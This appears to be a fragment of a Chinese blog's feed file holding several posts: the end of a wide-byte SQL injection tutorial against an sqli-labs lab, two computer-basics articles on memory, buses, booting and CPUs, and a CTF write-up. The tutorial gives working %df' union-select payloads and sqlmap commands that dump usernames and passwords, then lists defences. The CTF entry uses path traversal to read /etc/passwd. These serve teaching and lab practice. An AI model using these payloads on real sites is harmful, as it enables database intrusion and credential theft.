id="黑盒测试"><a href="#黑盒测试" class="headerlink" title="黑盒测试"></a>黑盒测试</h3><p>在可能的注入点后键入%df，之后进行注入测试</p><h3 id="白盒测试"><a href="#白盒测试" class="headerlink" title="白盒测试"></a>白盒测试</h3><ol><li><p>查看Mysql编码是否为GBK</p></li><li><p>是否使用preg_replace把单引号替换成<code>\&#39;</code></p></li><li><p>是否使用addslashes进行转义</p></li><li><p>是否使用mysql_real_escaoe_string进行转义</p><blockquote><p>mysql_real_escaoe_string原本就是用于抵抗宽字节转义的，他在转义特殊字符的情况时，也会考虑当前连接的字符集，但是在部分场景还是不能抵抗，因为程序没有指定连接PHP_Mysql的字符集</p></blockquote></li></ol><hr><h1 id="手工注入过程"><a href="#手工注入过程" class="headerlink" title="手工注入过程"></a>手工注入过程</h1><h3 id="查询当前用户"><a href="#查询当前用户" class="headerlink" title="查询当前用户"></a>查询当前用户</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.101.200&#x2F;Less-32&#x2F;?id&#x3D;%df&#39; union select 1,2,(select user()) --+</span><br></pre></td></tr></table></figure><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200818163912126.png" alt="image-20200818163912126"></p><h3 id="查询表名"><a href="#查询表名" class="headerlink" title="查询表名"></a>查询表名</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.101.200&#x2F;Less-32&#x2F;?id&#x3D;%df&#39; union select 1,2,(select table_name from information_schema.tables where table_schema&#x3D;database() limit 3,1) --+</span><br></pre></td></tr></table></figure><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200818164338320.png" alt="image-20200818164338320"></p><h3 id="查询列明"><a href="#查询列明" class="headerlink" title="查询列明"></a>查询列明</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.101.200&#x2F;Less-32&#x2F;?id&#x3D;%df&#39; union select 1,2,(select column_name from information_schema.columns where table_name&#x3D;0x7573657273 limit 5,1) --+</span><br></pre></td></tr></table></figure><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200818164542320.png" alt="image-20200818164542320"></p><h3 id="查询数据"><a href="#查询数据" class="headerlink" title="查询数据"></a>查询数据</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.101.200&#x2F;Less-32&#x2F;?id&#x3D;%df&#39; union select 1,2,(select concat(username,1,password) from security.users limit 0,1) --+</span><br></pre></td></tr></table></figure><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200818164917507.png" alt="image-20200818164917507"></p><hr><h1 id="工具注入"><a href="#工具注入" class="headerlink" title="工具注入"></a>工具注入</h1><p>我们首先直接使用sqlmap进行测试</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http:&#x2F;&#x2F;192.168.101.200&#x2F;Less-32&#x2F;?id&#x3D;1&quot;</span><br></pre></td></tr></table></figure><p>返回结果id不可注入</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200818165647602.png" alt="image-20200818165647602"></p><p>我们提前在后面加一个<code>%df</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http:&#x2F;&#x2F;192.168.101.200&#x2F;Less-32&#x2F;?id&#x3D;1%df&quot;</span><br></pre></td></tr></table></figure><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200818170001059.png" alt="image-20200818170001059"></p><p>也可以取数据</p><h2 id="当前用户"><a href="#当前用户" class="headerlink" title="当前用户"></a>当前用户</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http:&#x2F;&#x2F;192.168.101.200&#x2F;Less-32&#x2F;?id&#x3D;1%df&quot; --current-user</span><br></pre></td></tr></table></figure><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200818170042000.png" alt="image-20200818170042000"></p><h2 id="当前数据库"><a href="#当前数据库" class="headerlink" title="当前数据库"></a>当前数据库</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http:&#x2F;&#x2F;192.168.101.200&#x2F;Less-32&#x2F;?id&#x3D;1%df&quot; --current-db</span><br></pre></td></tr></table></figure><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200818170112142.png" alt="image-20200818170112142"></p><h2 id="数据表信息"><a href="#数据表信息" class="headerlink" title="数据表信息"></a>数据表信息</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http:&#x2F;&#x2F;192.168.101.200&#x2F;Less-32&#x2F;?id&#x3D;1%df&quot; -D security --tables</span><br></pre></td></tr></table></figure><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200818170317700.png" alt="image-20200818170317700"></p><h2 id="列信息"><a href="#列信息" class="headerlink" title="列信息"></a>列信息</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http:&#x2F;&#x2F;192.168.101.200&#x2F;Less-32&#x2F;?id&#x3D;1%df&quot; -D security -T users --columns</span><br></pre></td></tr></table></figure><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200818170522180.png" alt="image-20200818170522180"></p><h2 id="用户信息"><a href="#用户信息" class="headerlink" title="用户信息"></a>用户信息</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http:&#x2F;&#x2F;192.168.101.200&#x2F;Less-32&#x2F;?id&#x3D;1%df&quot; -D security -T users -C username,password --dump</span><br></pre></td></tr></table></figure><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200818170726620.png" alt="image-20200818170726620"></p><hr><h1 id="宽字节防御"><a href="#宽字节防御" class="headerlink" title="宽字节防御"></a>宽字节防御</h1><ol><li><p>使用utf-8编码，避免宽字节注入</p><p>宽字节注入不止是gbk中，韩文、日文等都是宽字节，都有可能存在宽字节注入</p></li><li><p>使用<code>mysql_real_escaoe_string</code>，使用的时候要加上<code>mysql_set_charset(&#39;gbk&#39;,$conn);</code></p></li><li><p>可以设置mysql的连接参数，<code>character_set_client=binary</code></p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200818171914811.png" alt="image-20200818171914811"></p></li></ol>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
          <category> Web安全 </category>
          
          <category> SQL注入 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>4.计算机基础之简述存储器、总线、系统启动流程</title>
      <link href="%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/Python/python%E5%9F%BA%E7%A1%80/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/python/4.%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80%E4%B9%8B%E7%AE%80%E8%BF%B0%E5%AD%98%E5%82%A8%E5%99%A8%E3%80%81%E6%80%BB%E7%BA%BF%E3%80%81%E7%B3%BB%E7%BB%9F%E5%90%AF%E5%8A%A8%E6%B5%81%E7%A8%8B/"/>
      <url>%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/Python/python%E5%9F%BA%E7%A1%80/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/python/4.%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80%E4%B9%8B%E7%AE%80%E8%BF%B0%E5%AD%98%E5%82%A8%E5%99%A8%E3%80%81%E6%80%BB%E7%BA%BF%E3%80%81%E7%B3%BB%E7%BB%9F%E5%90%AF%E5%8A%A8%E6%B5%81%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<h1 id="存储器"><a href="#存储器" class="headerlink" title="存储器"></a>存储器</h1><p>存储器是计算机的记忆单元，其核心功能就是存取数据</p><p>人们对存储器的希望总是容量大的、快速的、便宜的，但这三点是冲突的，不可能同时满足</p><p>所以基于目前的工艺水平，存储器就被分层了</p><a id="more"></a><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200814112205280.png" alt="image-20200814112205280"></p><p>存储器系统采用如上图的分层结构，顶层的存储器速度较高，容量较小，与底层的存储器相比每位的成本较高，其差别往往是十亿数量级的</p><p>之前已经提到过，由于存储器与存储器、存储器与CPU之间有着比较大的速度差，会导致运行效率的降低，所以通常的解决办法就是在存储器与内存之间逐级添加高速缓存和寄存器，来解决这个问题</p><h2 id="寄存器即L1缓存"><a href="#寄存器即L1缓存" class="headerlink" title="寄存器即L1缓存"></a>寄存器即L1缓存</h2><p>用与cpu相同材质制造，与cpu一样快，因而cpu访问它无时延，典型容量是：在32位cpu中为32<em>32，在64位cpu中为64</em>64，在两种情况下容量均&lt;1KB</p><p>寄存器通常放下一秒就会使用到的指令</p><h2 id="高速缓存即L2缓存"><a href="#高速缓存即L2缓存" class="headerlink" title="高速缓存即L2缓存"></a>高速缓存即L2缓存</h2><p>高速缓存则是放需要经常使用到的指令</p><p>主要由硬件控制高速缓存的存取，内存中有高速缓存行按照0<del>64字节为行0，64</del>127为行1。最常用的高速缓存行放置在cpu内部或者非常接近cpu的高速缓存中。当某个程序需要读一个存储字时，高速缓存硬件检查所需要的高速缓存行是否在高速缓存中。如果是，则称为<strong>高速缓存命中</strong>，缓存满足了请求，就不需要通过总线把访问请求送往主存(内存)，这毕竟是慢的。高速缓存的命中通常需要两个时钟周期。<strong>高速缓存为命中</strong>，就必须访问内存，这需要付出大量的时间代价。由于高速缓存价格昂贵，所以其大小有限，有些机器具有两级甚至三级高速缓存，每一级高速缓存比前一级慢但是容易大。</p><h2 id="内存RAM"><a href="#内存RAM" class="headerlink" title="内存RAM"></a>内存RAM</h2><p>RAM(随机存取存储器)，就是我们通常所说的内存，容量一直在不断攀升，所有不能再高速缓存中找到的，都会到主存中找，<strong>主存是易失性存储，断电后数据全部消失</strong></p><h2 id="只读内存ROM"><a href="#只读内存ROM" class="headerlink" title="只读内存ROM"></a>只读内存ROM</h2><p>ROM(只读内存，<strong>非易失性随机访问存储</strong>)，速度和内存相同，但是它只能读，计算机出场时，计算机厂商会在ROM提前写入的一段程序，通常这段程序常常关系到整个计算机系统核心底层的运行，关系到计算机的安全性，所以不允许修改</p><p>这段程序叫做BIOS(基本输入输出操作系统)</p><h2 id="CMOS"><a href="#CMOS" class="headerlink" title="CMOS"></a>CMOS</h2><p>CMOS，存取速度慢，断电数据丢失，但是基于电工做的它，耗电量极低。</p><p>计算机断电后，不联网同步时间的情况下，计算机内部的时间其实还是在工作，是因为主板上面有一个电池，一个时钟芯片，一个CMOS，电池为时钟芯片和CMOS供电，时钟芯片计算时间，然后存储到CMOS中，当然CMOS不止是存时间</p><h2 id="硬盘"><a href="#硬盘" class="headerlink" title="硬盘"></a>硬盘</h2><p>硬盘的典型代表有两种：机械硬盘和固态硬盘</p><h3 id="机械硬盘"><a href="#机械硬盘" class="headerlink" title="机械硬盘"></a>机械硬盘</h3><p>硬盘的存取原理依赖硬盘的转动，机械硬盘的存取数据都是放在盘片上面的，盘片是因为磁来存放数据的，所以也被称为磁盘，数据在磁盘上面其实本质上就是与由高低电频类似的磁信号，对应的二进制信号</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200814151349121.png" alt="image-20200814151349121"></p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200814151058728.png" alt="image-20200814151058728" style="zoom:50%;" /><p>所有的盘片被固定在一个轴上，盘片的转动，每转一圈磁头读取，被称为磁道，每个磁道划成若干扇区，扇区典型的值是通常为512字节一扇区</p><p>由于硬盘通常是多个盘片组成，所以把同一个戈丁手臂位置上所以的磁道合起来，组成一个柱面，磁盘的分区是从同属一个柱面到另外一个柱面的进行划分</p><blockquote><p>操作系统一次性读写的单位是一个block块</p><p>一个block块=》8扇区大小=4096bytes</p><p>block块可以人为定制大小</p></blockquote><p>数据都存放于一段一段的扇区，即磁道这个圆圈的一小段圆圈，从磁盘读取一段数据需要经历寻道时间和延迟时间</p><blockquote><p>计算机厂商，容量进制是1024</p><p>存储设备厂商，为了符合自己的利益，则规定容量进制不是1024而是1000</p></blockquote><p><strong>IO延迟</strong></p><p>数据都存放于一段一段的扇区，即磁道这个圆圈的一小段圆圈，从磁盘读取一段数据需要经历寻道时间和延迟时间</p><p>平均寻道时间：机械手臂转到数据所在磁道需要花费的时间(受限于物理工艺水平，厂商通常无法决定)</p><p>平均延迟时间：转半圈需要花费的时间</p><p>IO延迟=平均寻道时间+平均延迟时间</p><blockquote><p>优化程序运行效率的核心法则：能从内存取数据，就不要从硬盘取</p></blockquote><h3 id="虚拟内存"><a href="#虚拟内存" class="headerlink" title="虚拟内存"></a>虚拟内存</h3><p>许多计算机支持虚拟内存机制，该机制使计算机可以运行大于物理内存的程序，方法是将正在使用的程序放入内存取执行，而暂时不需要执行的程序放到磁盘的某块地方，这块地方成为虚拟内存</p><p>在linux中成为swap，这种机制的核心在于快速地映射内存地址，由cpu中的一个部件负责，成为存储器管理单元(Memory Management Unit MMU)</p><h2 id="磁带"><a href="#磁带" class="headerlink" title="磁带"></a>磁带</h2><p>在价钱相同的情况下比硬盘拥有更高的存储容量，虽然速度低于磁盘，但是因其大容量，在地震水灾火灾时可移动性强等特性，常被用来做备份。（常见于大型数据库系统中）</p><h2 id="I-O设备"><a href="#I-O设备" class="headerlink" title="I/O设备"></a>I/O设备</h2><p>I/O设备一般包括两个部分：设备控制器和设备本身</p><h3 id="控制器"><a href="#控制器" class="headerlink" title="控制器"></a>控制器</h3><p>是查找主板上的一块芯片或一组芯片（硬盘，网卡，声卡等都需要插到一个口上，这个口连的便是控制器），控制器负责控制连接的设备，它从操作系统接收命令，比如读硬盘数据，然后就对硬盘设备发起读请求来读出内容</p><p>控制器的功能：通常情况下对设备的控制是非常复杂和具体的，控制器的任务就是为操作系统屏蔽这些复杂而具体的工作，提供给操作系统一个简单而清晰的接口</p><h3 id="设备本身"><a href="#设备本身" class="headerlink" title="设备本身"></a>设备本身</h3><p>有相对简单的接口且标准的，这样大家都可以为其编写驱动程序了。要想调用设备，必须根据该接口编写复杂而具体的程序，于是有了控制器提供设备驱动接口给操作系统。必须把设备驱动程序安装到操作系统中</p><hr><h1 id="总线"><a href="#总线" class="headerlink" title="总线"></a>总线</h1><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200814224509097.png" alt="image-20200814224509097"></p><p>把计算机拆开大概是这个样子的，有很多的零部件，总线可以简单理解为是这些部件来回传输的线，我们把它归纳为下面这张图</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200814224645937.png" alt="image-20200814224645937"></p><p>上北下南，PCI桥被称为北桥，ISA桥被称为南桥</p><p>PCI桥负责把CPU和内存连接到一起，连接的都是高速设备</p><p>ISA桥负责其他的一些设备，都是一些比较慢速的设备</p><hr><h1 id="启动流程"><a href="#启动流程" class="headerlink" title="启动流程"></a>启动流程</h1><p>计算机刚刚买回来的时候，如果是裸机，是没有安装系统的，但它却可以直接运行起来，我们之前提到过计算机之所以能运行，肯定是收到软件支配的，那这个软件肯定就是厂商写的，就是我们之前提到的BIOS</p><h2 id="操作系统的启动流程"><a href="#操作系统的启动流程" class="headerlink" title="操作系统的启动流程"></a>操作系统的启动流程</h2><p>1.计算机加电，从ROM中读取BIOS</p><p>2.BIOS开始运行，检测硬件：cpu、内存、硬盘等(在BIOS的操作存放在CMOS中)</p><p>3.BIOS读取CMOS存储器中的参数，选择启动设备</p><p>4.从启动设备上读取第一个扇区的内容（MBR主引导记录512字节，前446为引导信息，后64为分区信息，最后两个为标志位）</p><p>5.根据分区信息读入bootloader启动装载模块，启动操作系统</p><p>6.然后操作系统询问BIOS，以获得配置信息。对于每种设备，系统会检查其设备驱动程序是否存在，如果没有，系统则会要求用户按照设备驱动程序。一旦有了全部的设备驱动程序，操作系统就将它们调入内核。然后初始有关的表格（如进程表），穿件需要的进程，并在每个终端上启动登录程序或GUI</p><h2 id="应用启动流程"><a href="#应用启动流程" class="headerlink" title="应用启动流程"></a>应用启动流程</h2><p>1.双击exe快捷方式–》exe文件的绝对路径</p><p>2.操作系统根据文件路径找到对应的硬盘位置，并将其代码加载到内存</p><p>3.控制CPU从内存中读取刚刚载入内存的应用程序的代码进行执行</p>]]></content>
      
      
      <categories>
          
          <category> 程序语言 </category>
          
          <category> Python </category>
          
          <category> python基础 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>3.计算机基础之简述CPU</title>
      <link href="%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/Python/python%E5%9F%BA%E7%A1%80/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/python/3.%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80%E4%B9%8B%E7%AE%80%E8%BF%B0CPU/"/>
      <url>%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/Python/python%E5%9F%BA%E7%A1%80/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/python/3.%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80%E4%B9%8B%E7%AE%80%E8%BF%B0CPU/</url>
      
        <content type="html"><![CDATA[<h1 id="CPU"><a href="#CPU" class="headerlink" title="CPU"></a>CPU</h1><p>中央处理器（CPU，central processing unit）作为计算机系统的运算和控制核心，是信息处理、程序运行的最终执行单元</p><h2 id="CPU指令集"><a href="#CPU指令集" class="headerlink" title="CPU指令集"></a>CPU指令集</h2><p>我们以人作为比喻，我们需要往前走的时候，手和脚会不自觉的进行协同前进，但是，我们并不会主观计算到，某个肌肉具体是怎么收缩运动的，如何进行协同，都是我们的大脑自动进行运算的</p><p>在现代CPU中同样集成了类似的功能，程序员编程的目的是为了控制计算机硬件工作，程序员的代码都会转换成cpu的指令集才能去控制其他硬件，所以程序员是通过直接控制cpu来达到间接控制其他硬件的目的</p><blockquote><p>程序—–&gt;CPU内部指令—–&gt;计算机硬件的操作</p></blockquote><a id="more"></a><h2 id="CPU分类"><a href="#CPU分类" class="headerlink" title="CPU分类"></a>CPU分类</h2><p>CPU的分类通常就是按照指令集进行分类的，通常分为两种，精简指令集和复杂指令集</p><h3 id="精简指令集"><a href="#精简指令集" class="headerlink" title="精简指令集"></a>精简指令集</h3><p>精简指令集（Reduced Instruction Set Computing，RISC）：这种CPU的设计中，微指令集较为精简，每个指令的运行时间都很短，完成的动作也很单纯，指令的执行效能较佳；但是若要做复杂的事情，就要由多个指令来完成。常见的RISC指令集CPU主要例如Sun公司的SPARC系列、IBM公司的Power Architecture（包括PowerPC）系列、与ARM系列等。</p><h3 id="复杂指令集"><a href="#复杂指令集" class="headerlink" title="复杂指令集"></a>复杂指令集</h3><p>复杂指令集（Complex Instruction Set Computer，CISC）与RISC不同，在CISC的微指令集中，每个小指令可以执行一些较低阶的硬件操作，指令数目多而且复杂，每条指令的长度并不相同。因此指令执行较为复杂所以每条指令花费的时间较长，但每条个别指令可以处理的工作较为丰富。常见的CISC微指令集CPU主要有AMD、Intel、VIA等的x86架构的CPU。</p><h3 id="比较"><a href="#比较" class="headerlink" title="比较"></a>比较</h3><p>CPU按照指令集可以分为精简指令集CPU和复杂指令集CPU两种，区别在于前者的指令集精简，每个指令的运行时间都很短，完成的动作也很单纯，指令的执行效能较佳；但是若要做复杂的事情，就要由多个指令来完成。后者的指令集每个小指令可以执行一些较低阶的硬件操作，指令数目多而且复杂，每条指令的长度并不相同。因为指令执行较为复杂所以每条指令花费的时间较长，但每条个别指令可以处理的工作较为丰富。</p><h2 id="x86架构64位"><a href="#x86架构64位" class="headerlink" title="x86架构64位"></a>x86架构64位</h2><h3 id="X86"><a href="#X86" class="headerlink" title="X86"></a>X86</h3><p>x86是针对cpu的型号或者说架构的一种统称，详细地讲，最早的那颗Intel发明出来的CPU代号称为8086，后来在8086的基础上又开发出了80285、80386….，因此这种架构的CPU就被统称为x86架构了。</p><p> 由于AMD、Intel、VIA所开发出来的x86架构CPU被大量使用于个人计算机上面，因此，个人计算机常被称为x86架构的计算机！</p><p>程序员开发出的软件最终都要翻译成cpu的指令集才能运行，因此软件的版本必须与cpu的架构契合，举个例子，我们在MySQL官网下载软件MySQL时名字为：</p><p>Windows(x86,32-bit),ZIP Archive (mysql-5.7.20-win32.zip)</p><p>我们发现名字中有x86，这其实就是告诉我们：该软件应该运行在x86架构的计算机上。</p><h3 id="64位-32位"><a href="#64位-32位" class="headerlink" title="64位/32位"></a>64位/32位</h3><p>回看程序运行过程，CPU会从内存中读取指令，然后进行运算，而cpu的位数就指的是cpu一次性能从内存中取出多少位二进制指令，64bit指的是一次性能从内存中取出64位二进制指令</p><p>在2003年以前由Intel所开发的x86架构CPU由8位升级到16、32位，后来AMD依此架构修改新一代的CPU为64位，到现在，个人计算机CPU通常都是x86_64的架构。</p><p>64位/32位的概念通常指的是数据总线的大小，具体的运算结果64位CPU和<a href="https://baike.baidu.com/item/%E7%AE%97%E6%9C%AF%E9%80%BB%E8%BE%91%E5%8D%95%E5%85%83/8954657">算术逻辑单元</a>架构是以<a href="https://baike.baidu.com/item/%E5%AF%84%E5%AD%98%E5%99%A8/187682">寄存器</a>、内存总线或者<a href="https://baike.baidu.com/item/%E6%95%B0%E6%8D%AE%E6%80%BB%E7%BA%BF/272650">数据总线</a>的大小为基准</p><p><strong>cpu具有向下兼容性</strong></p><p>指的是64位的cpu既可以运行64位的软件，也可以运行32位的软件，而32位的cpu只能运行32位的软件。这其实很好理解，如果把cpu的位数当成是车道的宽，而内存中软件的指令当做是待通行的车辆，宽64的车道每次肯定既可以通行64辆车，也可以通行32辆车，而宽32的车道每次却只能通行32辆车</p><h2 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器"></a>寄存器</h2><p>硬盘的速度远远小于CPU，所以为了方便CPU高速取数据，所以就有了内存</p><p>但内存的速度也小于CPU，CPU是通过高低电频逐步进行的数据运算，如果每个都需要单独从CPU逐个读取，CPU就会花费大量时间等待内存读取，会拖累CPU的运算速度，所以就有了寄存器。</p><p>寄存器通常在CPU内部，制作材料通常与CPU相同，尽可能的保证与CPU的频率相同，在运算时，可以将重复性高重要的数据放到寄存器，CPU可以从寄存器里直接快速加载，从而提升预算效率</p><h2 id="CPU工作流程"><a href="#CPU工作流程" class="headerlink" title="CPU工作流程"></a>CPU工作流程</h2><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200813124702014.png" alt="image-20200813124702014"></p><p>CPU的核心工作在于进行运算和判断，CPU首先会从内存代码段中读取指令放于指令寄存器，让控制单元进行控制，当运算到需要加载数据的时候，从内存数据段读取数据，然后放于存储单元，运算单元从存储单元读取数据进行运算和暂存，运算完成后，在将数据送回内存数据段</p><h2 id="内核态和用户态"><a href="#内核态和用户态" class="headerlink" title="内核态和用户态"></a>内核态和用户态</h2><p>计算机最核心的就是CPU，而CPU最核心的就是内部的指令集，CPU主要做两件事，一是运算，二是控制，所以CPU内部指令集也应该分为<strong>运算指令集</strong>和<strong>控制指令集</strong></p><p>我们写的程序是直接控制CPU，CPU转换成指令集在控制其他硬件</p><p>程序又分为系统程序和应用程序，系统程序可以控制硬件，而应用程序不能直接控制硬件</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200813131732435.png" alt="image-20200813131732435"></p><p>CPU有两种工作状态</p><h3 id="内核态：系统的操作内核"><a href="#内核态：系统的操作内核" class="headerlink" title="内核态：系统的操作内核"></a>内核态：系统的操作内核</h3><p>CPU所有的指令集都开放</p><h3 id="用户态：用户应用程序"><a href="#用户态：用户应用程序" class="headerlink" title="用户态：用户应用程序"></a>用户态：用户应用程序</h3><p>只开放运算相关指令集</p><p>CPU由于会同时运行“操作系统“和“应用程序“，且应用程序需要调用操作系统操作硬件，所以内核态和用户态会频繁切换</p><h2 id="多线程和多核芯片"><a href="#多线程和多核芯片" class="headerlink" title="多线程和多核芯片"></a>多线程和多核芯片</h2><p>我们把CPU进行一个比喻，一核代表工厂，一线程代表工厂里的流水线，原本一个工厂里面只有一条流水线，现在放进去了两条流水线，就叫一核二线程，但是工厂里不光只有流水线，还有原料运算等其他部分的存在，所以并不能等同于两个工厂的效率</p><pre><code>2核4线程：    2核代表有两个cpu，4线程指的是每个cpu都有两个线程=》假4核4核8线程    4核代表有4个cpu，8线程指的是每个cpu都有两个线程=》假8核</code></pre><blockquote><p>moore定律指出，芯片中的晶体管数量每18个月翻一倍，随着晶体管数量的增多，更强大的功能称为了可能，如</p><p>第一步增强：在cpu芯片中加入更大的缓存，一级缓存L1，用和cpu相同的材质制成，cpu访问它没有时延</p><p>第二步增强：一个cpu中的处理逻辑增多，intel公司首次提出，称为多线程（multithreading）或超线程（hyperthreading），对用户来说一个有两个线程的cpu就相当于两个cpu，我们后面要学习的进程和线程的知识就起源于这里，进程是资源单位而线程才是cpu的执行单位。</p><p>多线程运行cpu保持两个不同的线程状态，可以在纳秒级的时间内来回切换，速度快到你看到的结果是并发的，伪并行的，然而多线程不提供真正的并行处理，一个cpu同一时刻只能处理一个进程（一个进程中至少一个线程）</p><p>第三步增强：除了多线程，还出现了傲寒2个或者4个完整处理器的cpu芯片，如下图。要使用这类多核芯片肯定需要有多处理操作系统</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 程序语言 </category>
          
          <category> Python </category>
          
          <category> python基础 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>9.合天网安第九题-试下phpinfo吧</title>
      <link href="%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/CTF%E8%A7%A3%E9%A2%98/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/CTF%E8%A7%A3%E9%A2%98/9.%E5%90%88%E5%A4%A9%E7%BD%91%E5%AE%89%E7%AC%AC%E4%B9%9D%E9%A2%98-%E8%AF%95%E4%B8%8Bphpinfo%20/"/>
      <url>%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/CTF%E8%A7%A3%E9%A2%98/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/CTF%E8%A7%A3%E9%A2%98/9.%E5%90%88%E5%A4%A9%E7%BD%91%E5%AE%89%E7%AC%AC%E4%B9%9D%E9%A2%98-%E8%AF%95%E4%B8%8Bphpinfo%20/</url>
      
        <content type="html"><![CDATA[<h1 id="题目概况"><a href="#题目概况" class="headerlink" title="题目概况"></a>题目概况</h1><p>题目：合天网安第九题-试下phpinfo吧</p><p>题目网址:<a href="https://www.hetianlab.com/expc.do?ce=76c22b82-6aa5-457f-a86e-f5364acf1bae">https://www.hetianlab.com/expc.do?ce=76c22b82-6aa5-457f-a86e-f5364acf1bae</a></p><a id="more"></a><h2 id="实验指导书"><a href="#实验指导书" class="headerlink" title="实验指导书"></a>实验指导书</h2><p>题目简介：</p><p>flag就在题目里哟！不要因为第一眼看不到就放弃了！但是phpinfo在哪里呢？切换下路径试试？</p><p>目标机：Centos7 IP地址：10.1.1.147:5009</p><p>攻击机：Win 10   IP地址：随机分配</p><p>要求：获取目标flag</p><p>提示：flag格式为flag{}</p><hr><h1 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h1><p>打开网页查看</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200811163322099.png" alt="image-20200811163322099"></p><p>平平无奇源代码</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200811163434365.png" alt="image-20200811163434365"></p><p>随意切换一下语言</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200811163418946.png" alt="image-20200811163418946"></p><p>发现他是根据不同的php文件切换的语言，尝试切换一下，phpinfo</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200811163544075.png" alt="image-20200811163544075"></p><p>不对，但还是试试可不可以跨越路径，我们知道那个是centos系统，就试试<code>/etc/passwd</code></p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200811163835989.png" alt="image-20200811163835989"></p><p>就慢慢找吧，然后就在<code>../phpinfo.php</code></p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200811163913759.png" alt="image-20200811163913759"></p><p>一搜索就在页面底下发现了</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200811163955921.png" alt="image-20200811163955921"></p>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
          <category> CTF解题 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>7.Dnslog盲注(mysql8不可用)</title>
